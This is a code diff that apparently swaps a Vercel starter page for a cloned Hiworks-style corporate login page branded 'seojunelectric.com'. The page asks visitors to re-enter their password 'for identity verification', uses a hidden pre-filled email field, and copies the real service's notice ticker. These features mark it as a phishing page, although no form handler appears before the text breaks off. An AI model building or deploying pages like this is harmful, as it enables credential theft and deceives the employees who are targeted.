@@ -1,96 +1,290 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
-</html>
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+
+<style>
+	.login-box input[type='submit'], .login-box input[type='reset'], .next {
+		
+		width: 100%;
+		background-color: #157efb;
+        border: 0;
+		height: 48px;
+		color: #fff;
+		border-color: transparent;
+		font-size: 15px;
+		outline: none;
+		background-color: rgb(41 133 219 / .5);
+        cursor: default;
+	}
+	
+	.mantine-1w5kc82 {
+    font-family: inherit;
+    -webkit-tap-highlight-color: transparent;
+    text-decoration: none;
+    word-break: break-word;
+    line-height: 1.2;
+    color: rgb(216, 74, 73);
+    font-size: 0.8125rem;
+    letter-spacing: -0.0125rem;
+    display: block;
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+</style>
+<body style="border: 0px solid rgb(153, 153, 153);margin-top: 3.75rem;display: flex;/* box-sizing: border-box; */align-content: stretch;flex-direction: column;justify-content: space-evenly;align-items: center;">
+<header class="mb-[60px]" style="border: 0px solid rgb(153, 153, 153);color: rgb(0, 0, 0);text-transform: none;text-indent: 0px;letter-spacing: normal;font-family: &quot;Malgun Gothic&quot;, &quot;맑은 고딕&quot;, &quot;Apple SD Gothic Neo&quot;, 돋움, dotum, sans-serif;font-size: 16px;font-style: normal;font-weight: 400;margin-bottom: 40px;word-spacing: 0px;display: block;white-space: normal;box-sizing: border-box;orphans: 2;widows: 2;background-color: rgb(255, 255, 255);font-variant-ligatures: normal;font-variant-caps: normal;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><h1 class="mx-auto w-fit leading-[0]" style="margin: 0px auto;border: 0px solid rgb(153, 153, 153);line-height: 0;font-size: 2em;font-weight: inherit;box-sizing: border-box;">
+<img class="object-contain w-[200px] h-[40px]" style="border: 0px rgb(153, 153, 153);width: 200px;height: 60px;vertical-align: middle;display: block;max-width: 100%;box-sizing: border-box;object-fit: contain;" alt="seojunelectric.com" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDUuMDc1IiBoZWlnaHQ9IjIzLjE2OCIgdmlld0JveD0iMCAwIDEwNS4wNzUgMjMuMTY4Ij4KICA8ZyBpZD0ibG9nbyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTcwMi41MDEgLTQ3Ni40MTEpIj4KICAgIDxwYXRoIGlkPSLtlansuZjquLBfNjE4IiBkYXRhLW5hbWU9Iu2Vqey5mOq4sCA2MTgiIGQ9Ik05NS4yNTQsMjEuNjA4YTExLjQxNiwxMS40MTYsMCwwLDEtMi42ODYtMS4zMjhsMS45LTIuMDM4YTcuNzc2LDcuNzc2LDAsMCwwLDEuNjk0LjgyMyw2Ljc3OSw2Ljc3OSwwLDAsMCwyLjM0Ny40NSwyLjgyMywyLjgyMywwLDAsMCwxLjY2MS0uNDIyLDEuMzIxLDEuMzIxLDAsMCwwLC41OTEtMS4xMjlWMTcuOTFhMS4wNCwxLjA0LDAsMCwwLS4yNjEtLjcwNiwyLjE4OCwyLjE4OCwwLDAsMC0uNzE0LS41MTcsOC4zMjcsOC4zMjcsMCwwLDAtMS4wNDMtLjQwOHEtLjU5MS0uMTktMS4yMjItLjM4MS0uOC0uMjE3LTEuNjA2LS41MTdhNS44NCw1Ljg0LDAsMCwxLTEuNDU2LS43NzVBMy44NjksMy44NjksMCwwLDEsOTMuNCwxMy40MjNhMy40LDMuNCwwLDAsMS0uNDEyLTEuNzQxdi0uMDU0YTQuMDMxLDQuMDMxLDAsMCwxLDEuNS0zLjIwOSw0LjkyNCw0LjkyNCwwLDAsMSwxLjY0OC0uODcsNi42NjcsNi42NjcsMCwwLDEsMi4wMTgtLjMsOS4xOTQsOS4xOTQsMCwwLDEsMi43NzMuNDQxLDEyLjY3MywxMi42NzMsMCwwLDEsMi44ODMsMS4zOTNsLTEuOSwyLjAyNmE4LjQ2OCw4LjQ2OCwwLDAsMC0xLjg2MS0uODQ4LDYuMTExLDYuMTExLDAsMCwwLTEuOTc3LS4zNjksMi40MTksMi40MTksMCwwLDAtMS41LjQwOCwxLjI1LDEuMjUsMCwwLDAtLjUzNiwxLjAzM3YuMDU1YS45MzIuOTMyLDAsMCwwLC4yNzUuNjY3LDIuNzEsMi43MSwwLDAsMCwuNzI4LjUxNiw4LjE1NSw4LjE1NSwwLDAsMCwxLjA0My40MzZxLjU5LjIsMS4yMjIuMzk0LjguMjQ1LDEuNTkzLjU3MWE2LjY3OSw2LjY3OSwwLDAsMSwxLjQ0Mi44LDQuMDIsNC4wMiwwLDAsMSwxLjA1NywxLjE1NiwzLjE0NSwzLjE0NSwwLDAsMSwuNDExLDEuNjU5di4wNTRhNC40NzYsNC40NzYsMCwwLDEtLjQxMSwxLjk4NiwzLjg5LDMuODksMCwwLDEtMS4xNCwxLjQsNS4xMjEsNS4xMjEsMCwwLDEtMS43MTYuODQzLDcuNiw3LjYsMCwwLDEtMi4xMTQuMjg1QTkuNzUsOS43NSwwLDAsMSw5NS4yNTQsMjEuNjA4Wk00Ni41OCwxNC42OUE3LjUyNCw3LjUyNCwwLDEsMSw1NC4xLDIyLjE1OCw3LjUsNy41LDAsMCwxLDQ2LjU4LDE0LjY5Wm0zLjM0OSwwQTQuMTc1LDQuMTc1LDAsMSwwLDU0LjEsMTAuNTQ2LDQuMTY0LDQuMTY0LDAsMCwwLDQ5LjkyOSwxNC42OVpNODcuMjIyLDIybC00LjM2Ni02LjIxNC0yLjAzMiwyLjFWMjJINzcuNDc1VjBoMy4zNDlWMTMuOTgyTDg2LjgzOCw3LjZoNC4wMzZsLTUuNzY2LDUuODZMOTEuMDY2LDIyWk02NC4wODUsMjJWNy42MWgzLjM1VjkuODYzYTguMDA1LDguMDA1LDAsMCwxLC43OC0uOTc2LDUuMTA3LDUuMTA3LDAsMCwxLC45ODUtLjgxMiw1LjA1Miw1LjA1MiwwLDAsMSwxLjIzMi0uNTY0LDUuMTYzLDUuMTYzLDAsMCwxLDEuNTItLjIwNiw0Ljg0NCw0Ljg0NCwwLDAsMSwzLjgwNiwxLjVMNzMuMTcsMTEuNTI2bC0uMjIzLS4yODRhMi44NjksMi44NjksMCwwLDAtMi4yNzMtLjkxMSwzLjA5MywzLjA5MywwLDAsMC0yLjM0MS45MzgsMy42MzksMy42MzksMCwwLDAtLjksMi42MjNWMjJaTTM3LjgzNiwyMiwzNC42LDEyLjE1NywzMS4zMjksMjJIMjguMzY0bC00LjctMTQuNWgzLjRsMi45MSw5Ljg2NkwzMy4yLDcuNDQxaDIuODI5bDMuMjQsOS45MjFMNDIuMjMsNy41aDMuMzIyTDQwLjgsMjJaTTE3LjIxNSwyMlY3LjZoMy4zNVYyMlptLTcuNTUsMFYxMy44MzhhMy44LDMuOCwwLDAsMC0uOC0yLjYsMi44NjgsMi44NjgsMCwwLDAtMi4yNzMtLjkxMSwzLjEsMy4xLDAsMCwwLTIuMzQxLjkzOCwzLjY0MSwzLjY0MSwwLDAsMC0uOSwyLjYyNFYyMkgwVjBIMy4zNDlWOS44NjJhOC4wNzUsOC4wNzUsMCwwLDEsLjc4MS0uOTc2LDUuMTA3LDUuMTA3LDAsMCwxLC45ODUtLjgxMiw1LjA1Miw1LjA1MiwwLDAsMSwxLjIzMi0uNTY0LDUuMTU5LDUuMTU5LDAsMCwxLDEuNTE5LS4yMDYsNC44NDYsNC44NDYsMCwwLDEsMy44MDcsMS41LDUuODI2LDUuODI2LDAsMCwxLDEuMzQxLDQuMDMzVjIyWm02Ljk2OS0xOS43NWEyLjI1NywyLjI1NywwLDEsMSwyLjI1NywyLjI0NEEyLjI1LDIuMjUsMCwwLDEsMTYuNjM0LDIuMjQ1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNzAzLjAwMSA0NzYuOTExKSIgZmlsbD0iIzEwODBkZCIgc3Ryb2tlPSJyZ2JhKDAsMCwwLDApIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiIHN0cm9rZS13aWR0aD0iMSIvPgogICAgPHJlY3QgaWQ9IuyCrOqwge2YlV81MzYyIiBkYXRhLW5hbWU9IuyCrOqwge2YlSA1MzYyIiB3aWR0aD0iMTA0IiBoZWlnaHQ9IjIzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3MDMgNDc2LjU4KSIgZmlsbD0ibm9uZSIvPgogIDwvZz4KPC9zdmc+Cg=="></h1></header>
+<main class="grow" style="border: 0px solid rgb(153, 153, 153);/* color: rgb(0, 0, 0); */text-transform: none;text-indent: 0px;letter-spacing: normal;font-family: &quot;Malgun Gothic&quot;, &quot;맑은 고딕&quot;, &quot;Apple SD Gothic Neo&quot;, 돋움, dotum, sans-serif;font-size: 16px;font-style: normal;font-weight: 400;word-spacing: 0px;display: block;white-space: normal;box-sizing: border-box;orphans: 2;widows: 2;flex-grow: 1;background-color: rgb(255, 255, 255);font-variant-ligatures: normal;font-variant-caps: normal;-webkit-text-stroke-width: 0px;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;"><p></p><div style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;"><div style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;">
+
+
+
+
+<form class="w-full" style="border: 0px solid rgb(153, 153, 153); width: 400px; box-sizing: border-box;">
+<fieldset class="flex max-w-[400px] flex-col" style="margin: 0px; padding: 0px; border: 0px solid rgb(153, 153, 153); display: flex; max-width: 400px; box-sizing: border-box; flex-direction: column;"><div class="mb-8 text-center" style="border: 0px solid rgb(153, 153, 153); text-align: center; margin-bottom: 2rem; box-sizing: border-box;">
+
+<legend class="mb-3 w-full text-24px font-bold" style="padding: 0px; border: 0px solid rgb(153, 153, 153); width: 400px; color: inherit; letter-spacing: -0.72px; font-size: 1.5rem; font-weight: 700; margin-bottom: 0.75rem; display: table; white-space: normal; max-width: 100%; box-sizing: border-box;">Sign in to<span>&nbsp;</span><span class="font-bold text-gray-400" id="connect" style="border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); font-weight: 700; box-sizing: border-box;">
+
+</span></legend><p class="mb-8 text-14px" style="margin: 0px 0px 2rem; border: 0px solid rgb(153, 153, 153); letter-spacing: -0.21px; font-size: 0.87rem; box-sizing: border-box;">Please enter your password for identity verification.</p>
+
+<div class="inline-flex h-9 items-center rounded-[18px] border border-gray-50 px-5" aria-hidden="true" style="border-width: 1px; border-style: solid; border-radius: 18px; height: 2.25rem; padding-right: 1.25rem; padding-left: 1.25rem; display: inline-flex; box-sizing: border-box; align-items: center;"><svg xmlns="http://www.w3.org/2000/svg" class="mr-2" viewBox="0 0 16 16" width="16" height="16">
+
+<path style="fill: rgb(144, 144, 144);" d="M 8 0 a 8 8 0 1 0 8 8 a 8 8 0 0 0 -8 -8" data-name="\uD328\uC2A4 98550"></path>
+<path style="fill: rgb(255, 255, 255); stroke: transparent; stroke-miterlimit: 10;" transform="translate(-3723.73 -20354.9)" d="M 3727 20366.9 a 3.6 3.6 0 0 1 3.175 -1.928 a 0.735 0.735 0 0 1 0.235 0.037 a 4.043 4.043 0 0 0 2.638 0 a 0.726 0.726 0 0 1 0.23 -0.037 a 3.6 3.6 0 0 1 3.175 1.928 a 6.171 6.171 0 0 1 -9.452 0 Z m 1.886 -6.057 a 2.84 2.84 0 1 1 2.837 2.836 a 2.837 2.837 0 0 1 -2.836 -2.839 Z" data-name="\uD569\uCE58\uAE30 689"></path></svg>
+<span id="emailch" style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;"></span></div></div>
+
+<input name="email" class="sr-only" style="margin: -1px; padding: 0px; border: 0px solid rgb(153, 153, 153); width: 1px; height: 1px; color: inherit; line-height: 1.15; overflow: hidden; font-family: sans-serif; font-size: 16px; font-weight: inherit; white-space: nowrap; position: absolute; clip: rect(0px, 0px, 0px, 0px); box-sizing: border-box;" readonly="" value="" autocomplete="username"  id="email"   >
+
+
+<div class="mantine-InputWrapper-root mantine-TextInput-root mb-5 mantine-vb1jt1" style="border: 0px solid rgb(153, 153, 153); height: 40px; line-height: 1.55; font-family: inherit; margin-bottom: 1.25rem; box-sizing: border-box;"><div class="mantine-Input-wrapper mantine-TextInput-wrapper mantine-1v7s5f8" style="border: 0px solid rgb(153, 153, 153); height: 40px; position: relative; box-sizing: border-box;">
+
+<div class="mantine-16k3d8y mantine-Input-icon mantine-TextInput-icon" style="border: 0px solid rgb(153, 153, 153); left: 0px; top: 0px; width: 2.25rem; bottom: 0px; color: rgb(173, 181, 189); display: flex; position: absolute; z-index: 1; box-sizing: border-box; pointer-events: none; justify-content: center; align-items: center; -webkit-box-align: center; -webkit-box-pack: center;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="14" height="14">
+<path style="fill: none;" d="M 0 0 h 14 v 14 H 0 Z" data-name="\uC0AC\uAC01\uD615 11664"></path><g data-name="\uADF8\uB8F9 59573">
+<path style="fill: rgb(144, 144, 144);" transform="translate(-525.855 -65.679)" d="M 538.1 70.054 h -1.75 v -0.875 a 3.5 3.5 0 0 0 -7 0 v 0.875 h -1.75 a 0.875 0.875 0 0 0 -0.875 0.875 V 78.8 a 0.875 0.875 0 0 0 0.875 0.875 h 10.5 a 0.875 0.875 0 0 0 0.875 -0.875 v -7.871 a 0.875 0.875 0 0 0 -0.875 -0.875 Z m -7.875 -0.875 a 2.625 2.625 0 0 1 5.25 0 v 0.875 h -5.25 Z M 538.1 78.8 h -10.5 v -7.871 h 10.5 Z" data-name="\uD328\uC2A4 6923"></path>
+<path style="fill: rgb(144, 144, 144);" transform="translate(-526.542 -66.679)" d="M 533.98 73.754 a 1.312 1.312 0 0 0 -0.875 2.475 v 1.83 h 0.875 v -1.83 a 1.312 1.312 0 0 0 0 -2.475 Z" data-name="\uD328\uC2A4 6924"></path></g></svg></div>
+
+<input name="password" class="mantine-Input-input mantine-TextInput-input mantine-p2wiva" id="password" aria-invalid="false" style="margin: 0px; padding: 8px 10px 8px 2.25rem; border-radius: 2px; border: 1px solid rgb(214, 214, 214); transition:border-color rgb(41 133 219 / .5); border-image: none; width: 400px; height: 2.5rem; text-align: left; color: rgb(51, 51, 51); line-height: 2.5rem; letter-spacing: -0.01rem; overflow: visible; font-family: inherit; font-size: 0.87rem; font-weight: inherit; 
+display: block; min-height: 0px; box-sizing: border-box; background-color: rgb(255, 255, 255); appearance: none; -webkit-tap-highlight-color: transparent; resize: none;" type="password" placeholder="Password" value="" autocomplete="current-password" data-with-icon="true"></div></div><span class="mantine-Text-root mantine-InputWrapper-error mantine-TextInput-error mantine-1w5kc82" id="msg"></span>
+
+<button  id="submit-btn"class="next login_normal disabled" style="border-width: 1px; border-style: solid; margin: 0px; padding: 0px 60px; border-radius: 0.25rem; height: 2.75rem; text-align: left;  text-transform: none; line-height: 1.15; letter-spacing: 
+-0.27px; overflow: visible; font-family: inherit; font-size: 1.12rem; font-weight: inherit; text-decoration: none; display: flex; cursor: default; box-sizing: border-box;  justify-content: center; align-items: center; cursor: pointer;" type="submit"><span style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;">Sign-in</span></button></fieldset>
+</form>
+
+
+
+
+
+<div class="mt-3 flex justify-between" style="border: 0px solid rgb(153, 153, 153);margin-top: 0.75rem;display: flex;box-sizing: border-box;justify-content: space-between;"><div class="flex items-center gap-2" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.5rem;">
+<button class="mantine-UnstyledButton-root flex cursor-pointer items-center gap-1.5 rounded border-none bg-transparent text-primary disabled:cursor-default disabled:opacity-30 hover:text-blue-600 active:text-blue-600 h-[26px] gap-1.5 text-14px h-[34px] mantine-id0m02" style="margin: 0px; padding: 0px; border-radius: 0.25rem; border: 0px currentColor; border-image: none; height: 34px; text-align: left; color: rgb(41, 133, 219); text-transform: none; line-height: 1.15; letter-spacing: -0.21px; 
+overflow: visible; font-family: inherit; font-size: 0.87rem; font-weight: inherit; text-decoration: none; display: flex; cursor: pointer; box-sizing: border-box; align-items: center; background-image: none; background-color: transparent; appearance: button; gap: 0.375rem; -webkit-tap-highlight-color: transparent;" type="button"><span style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;">Sign in with another ID</span></button></div>
+<div class="flex items-center gap-2" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.5rem;"><div class="mantine-Switch-root mantine-Switch-root mantine-1knyxmk" style="border: 0px solid rgb(153, 153, 153); position: relative; box-sizing: border-box;"><div class="mantine-hqx0d1 mantine-Switch-body" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box;">
+<input class="mantine-Switch-input mantine-7refu0" id="mantine-4b3errhzl" style="margin: 0px; padding: 0px; border: 0px solid rgb(153, 153, 153); width: 0px; height: 0px; color: inherit; line-height: 1.15; overflow: hidden; font-family: sans-serif; font-size: 16px; font-weight: inherit; white-space: nowrap; position: absolute; box-sizing: border-box; background-color: rgb(41, 133, 219);" aria-label="IP Security off" type="checkbox">
+<label class="mantine-Switch-track mantine-1ra7d1l" style="margin: 0px; border-radius: 0.75rem; border: currentColor; transition:color 150ms; border-image: none; width: 2.25rem; height: 1.5rem; color: rgb(255, 255, 255); line-height: 0; overflow: hidden; font-size: 0.37rem; font-weight: 600; display: flex; position: relative; z-index: 0; cursor: default; min-width: 2.37rem; box-sizing: border-box; order: 1; align-items: center; background-color: rgb(41, 133, 219); appearance: none; 
+-webkit-box-align: center; -webkit-tap-highlight-color: transparent; user-select: none;" for="mantine-4b3errhzl"><div class="mantine-Switch-thumb mantine-18t8wwz" style="border-radius: 50%; border: 0.5px solid rgb(255, 255, 255); transition:left 150ms; border-image: none; left: calc((100% - 1.25rem) - 0.125rem); width: 1.25rem; height: 1.25rem; display: flex; position: absolute; z-index: 1; box-sizing: border-box; box-shadow: 0px 2px 1px rgba(0,0,0,0.06); background-color: white;"></div>
+<div class="mantine-1tps2x6 mantine-Switch-trackLabel" style="margin: 0px calc(1rem) 0px 0px; border: 0px solid rgb(153, 153, 153); transition:margin 150ms; height: 24px; min-width: calc(1.5rem); box-sizing: border-box; place-content: center; padding-inline: 0.3125rem;"></div></label>
+<div class="mantine-1vynagh mantine-Switch-labelWrapper" style="border: 0px solid rgb(153, 153, 153); color: rgb(0, 0, 0); line-height: 1.25rem; font-family: inherit; font-size: 0.87rem; display: inline-flex; cursor: default; box-sizing: border-box; flex-direction: column; order: 2; -webkit-tap-highlight-color: transparent;"></div></div></div>
+<button class="font-[inherit] text-14px" style="margin: 0px; padding: 0px; border: 0px solid rgb(153, 153, 153); color: inherit; text-transform: none; line-height: 1.15; letter-spacing: -0.21px; overflow: visible; font-family: inherit; font-size: 0.87rem; font-weight: inherit; cursor: pointer; box-sizing: border-box; background-image: none; background-color: transparent; appearance: button;" type="button">IP Security</button></div></div></div>
+<div class="mt-10 flex h-6 w-full overflow-hidden text-gray-400" style="border: 0px solid rgb(153, 153, 153); width: 400px; height: 1.5rem; color: rgb(103, 103, 103); overflow: hidden; margin-top: 2.5rem; display: flex; box-sizing: border-box;"><svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 grow-0 self-center" viewBox="0 0 16 14" width="16" height="14"><defs><clipPath id="jqwjrqddha"><path style="fill: none;" d="M 0 0 h 16 v 14 H 0 Z" data-name="\uC0AC\uAC01\uD615 144435"></path></clipPath>
+</defs><g style="clip-path: url(&quot;#jqwjrqddha&quot;);" data-name="\uADF8\uB8F9 269070"><path style="fill: rgb(224, 232, 238);" d="M 8 9.588 s 2.189 0 5.2 2.307 a 0.5 0.5 0 0 0 0.8 -0.395 V 0.5 a 0.5 0.5 0 0 0 -0.8 -0.391 C 10.189 2.412 8 2.412 8 2.412 Z" data-name="\uD328\uC2A4 98612"></path><path style="fill: rgb(226, 140, 70);" d="M 1.5 9.6 H 8 V 2.412 H 1.5 a 1.5 1.5 0 0 0 -1.5 1.5 V 8.1 a 1.5 1.5 0 0 0 1.5 1.5" data-name="\uD328\uC2A4 98613"></path>
+<path style="fill: rgb(226, 140, 70);" d="M 5 9 H 2 v 4 a 1 1 0 0 0 1 1 h 1 a 1 1 0 0 0 1 -1 Z" data-name="\uD328\uC2A4 98614"></path><path style="fill: rgb(159, 166, 173);" d="M 15 7.5 v -3 a 1 1 0 0 1 1 1 v 1 a 1 1 0 0 1 -1 1" data-name="\uD328\uC2A4 98615"></path></g></svg><div class="swiper-container swiper-container-initialized swiper-container-vertical" style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box;">
+<div class="swiper-wrapper" style="border: 0px solid rgb(153, 153, 153); box-sizing: border-box; transform: translate3d(0px, -96px, 0px); transition-duration: 300ms;"><div class="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-next" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="4">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">전자결재 문서 제목 설정 기능 추가 안내</a></div></div><div class="swiper-slide" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="0">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">전자세금계산서 EMS 발송 이력 관리 기능 업데이트 안내</a></div></div><div class="swiper-slide" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="1">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">하이웍스 오피스 정기 점검 안내 (9/23 22:00~04:00)</a></div></div><div class="swiper-slide swiper-slide-prev" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="2">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">하이웍스 전자세금계산서 국세청 전송 일시 중지 안내</a></div></div><div class="swiper-slide swiper-slide-active" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="3">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer"></a></div></div><div class="swiper-slide swiper-slide-next" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="4">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
+<a class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]" style="background: none; border: 0px solid rgb(153, 153, 153); color: rgb(103, 103, 103); letter-spacing: -0.21px; overflow: hidden; padding-left: 0.62rem; font-size: 0.87rem; text-decoration: inherit; display: block; white-space: nowrap; -ms-text-overflow: ellipsis; max-width: 380px; box-sizing: border-box;" href="" target="_blank" rel="noopener noreferrer">전자결재 문서 제목 설정 기능 추가 안내</a></div></div><div class="swiper-slide swiper-slide-duplicate" style="border: 0px solid rgb(153, 153, 153); height: 24px; box-sizing: border-box;" data-swiper-slide-index="0">
+<div class="swiper-slide flex items-center gap-1.5" style="border: 0px solid rgb(153, 153, 153); display: flex; box-sizing: border-box; align-items: center; gap: 0.375rem;">
